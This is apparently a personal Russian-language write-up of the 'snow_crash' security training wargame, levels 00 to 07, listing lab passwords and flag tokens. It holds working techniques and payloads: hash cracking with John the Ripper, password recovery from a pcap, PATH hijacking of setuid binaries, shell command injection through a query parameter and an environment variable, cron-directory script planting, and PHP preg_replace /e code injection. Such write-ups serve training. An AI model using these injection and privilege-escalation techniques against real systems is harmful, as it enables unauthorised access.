# level00

find / -user flag00 2>/dev/null
cat /usr/sbin/john

dcode.fr:
Rechercher un outil ввести содержимое файла
чуть ниже перейти по ссылке для поиска идентификатора Need to decrypt a message? Try our cipher identifier! https://www.dcode.fr/cipher-identifier

подойдет ROT Cipher https://www.dcode.fr/rot-cipher, можно цезаря
первый результат в списке - пароль

su flag00 с этим паролем nottoohardhere

getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
перехожу ко 2му уровню
su level01 x24ti5gi3x0ol2eh4esiuxias

# level01
пользователь:пароль(х или другой символ, /etc/shadow расшифрованные пароли):id пользователя uid: gid id группы: домашняя директория: дефолтный shell

Нахожу зашифрованный пароль flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
Создаю файл с этой строкой и передаю в john

https://download.openwall.net/pub/projects/john/contrib/macosx/
  ||
  \/
john-1.8.0.9-jumbo-macosx_avx2.zip

./john ~/Desktop/snow_crash/lvl01ForJohn
  cat john.pot
    42hDRfypTqqnw:abcdefg
либо 
./john ~/Desktop/snow_crash/lvl01ForJohn --show
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

su flag01
Password: abcdefg
Don't forget to launch getflag !

getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf

# level02
ls -la
cat level02.pcap 

https://www.tcpdump.org/manpages/tcpdump.1.html

tcpdump -r ~/level02.pcap -n -xq -tttt \
    'tcp[13] & 8 != 0 and src 59.233.235.218' 2>/dev/null |\
    grep -A 10000 "06:23:34" |\
    grep "0x0030" |\
    cut -d' ' -f5 |\
    ./decoder
 -n   ip   не конвертировать в доменное имя
 tcpdump -r не покажет тело пакета - только заголовки

 -xq покажет тело пакета
 -X  попытается как ascii расшифровать тело пакета

 tcp[13] находим заголовок, который отвечает за длину тела.

tcpdump -r ~/level02.pcap -xq
о tcp пакетах
 https://networkguru.ru/protokol-transportnogo-urovnia-tcp-chto-nuzhno-znat/
  ||
  \/
пакеты с флагами PSH не буферизуются, а сразу в приложение идут. Нам нужны именно они
 картинка Заголовок TCP с ней отсчитываю: source port - 0 и 1 байт, destination port - 2 и 3 ,
 sequence number 4-7 и т.д. => получаю флаги под номером 13
 среди них умножаю этот байт на 8 (00001000 - здесь пуш под номером 5, то есть 8)
tcp[13] & 8 != 0 проверяет, установлен ли этот флаг в 0 или 1


and src 59.233.235.218 фильтруем пакеты по отправителю (отправитель вводит пароль)

tcpdump -r ~/level02.pcap -n -Xq | nl | grep assword
по списку вижу первый непустой пакет - 06:23:34 после запроса пароля

grep -A 10000 "06:23:34" |\
    grep "0x0030" |\
все строки ниже этого времени и содержащие 0x0030 (там тело TCP пакета)
10000 количество отображаемых строк

cut -d' ' -f5 после пробела взять 5й столбец

получаю символ в 16ричной системе
перевожу в ascii. Для этого можно либо онлайн, либо свой декодер использовать (онлайн может не удалять символы при 7f встрече)
 получаю:
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c 0d
ft_wandrNDRelL0L

получаю  ft_waNDReL0L

su flag02 с этим паролем ft_waNDReL0L

getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
перехожу ко 3му уровню
su level03 kooda2puivaav1idi4f57q8iq

# level03
ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
x - можно запустить
флаг прав s -запустить с правами создателя

ltrace выведет все библиотечные функции, которые используются
ltrace ./level03

system("/usr/bin/env echo Exploit me")
создаю свой echo, меняю PATH на путь к себе вначале, запускаю level03
ls -la /
нахожу место допустимое для записи
d-wx-wx-wx   4 root root   80 Feb  6 13:14 tmp

создаю своё echo
#!/bin/bash
getflag

chmod 777 ./echo
export PATH=/tmp:$PATH

запускаю снова 
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

перехожу ко 4му уровню
su level04 qi0maab88jeaj46qoumi7maus

# level04
ls -la
cat level04.pl

обратиться к первому переданному аргументу и его значение присвоить переменной y
  $y = $_[0];

здесь  print `echo $y 2>&1`; ` работают аналогично system

index.py?x=$getflag

x(param("x"));
в квери параметре если указать index.py?x=$(getflag), подставится нужная команда вместо x
curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

перехожу ко 5му уровню
su level05 ne2searoevaevoem4ov4ar8ap

# level05

В терминале при переходе на уровень появляется сообщение, что пришло письмо (иногда не появляется).
В переменной окружения MAIL путь к письму

cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

*/2 * * * * синтаксис линукс планировщика. Для расшифровки:
https://crontab.guru/
 ||
 \/
“At every 2nd minute.”
значит запускается скрипт с правами flag05

cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

значит, надо положить в /opt/openarenaserver/ свой скрипт
getfacl /opt/openarenaserver/ - покажет наличие возможности записывать в эту папку

echo "getflag > /opt/openarenaserver/psswflag" > /opt/openarenaserver/run.sh

cat /opt/openarenaserver/psswflag
Check flag.Here is your token : viuaaale9huek52boumoomioc

su level06 viuaaale9huek52boumoomioc

# level06

ls -la
./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

cat level06.php
```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```


о модификаторе е
https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier

$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 

вызывается функция "y(\"\\2\")", и применяется к строке а
\2 - вторая скобочная группа в регулярных выражениях

(\[x (.*)\]) - первая скобочная группа
     (.*)    - вторая скобочная группа

https://regexr.com/
визуализирует регулярное выражение
[x fsdg] подсветит, то есть что-то, что начинается "[x ", далее "." - это 1 любой символ, "*" - сколько угодно символов, далее "]". Значит, что будет вызвана функция у с fsdg.

$r = x($argv[1], $argv[2]); х вызывается с агрументами
function x($y, $z) { 
    $a = file_get_contents($y); 
file_get_contents - читает содержимое файла

Создаю файл и передаю его в аргументы с содержимым:
2 варианта:
[x ${`getflag`}]
[x {${system(getflag)}}]

echo "This is the value of the var named by the return value of getName(): {${getName()}}"
https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple

в php `` отработает как функция system

echo '[x {${system(getflag)}}]' > /tmp/myy
где ${} позволят вставить значение exec(getflag), то есть exec(getflag) не текст будет, а вызовется функция. Это нужно, потому что здесь  двойные кавычки y(\"\\2\").

./level06 /tmp/myy gdfgdfgh
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

su level07 wiok45aaoguiboiki2tuin6ub

# level07

ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                 = 2007
geteuid()                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff644, 0x8048688, 0xbfffff27, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++

export LOGNAME='$(getflag)'
./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

su level08 fiumuikeil55xe9cu4dood66h
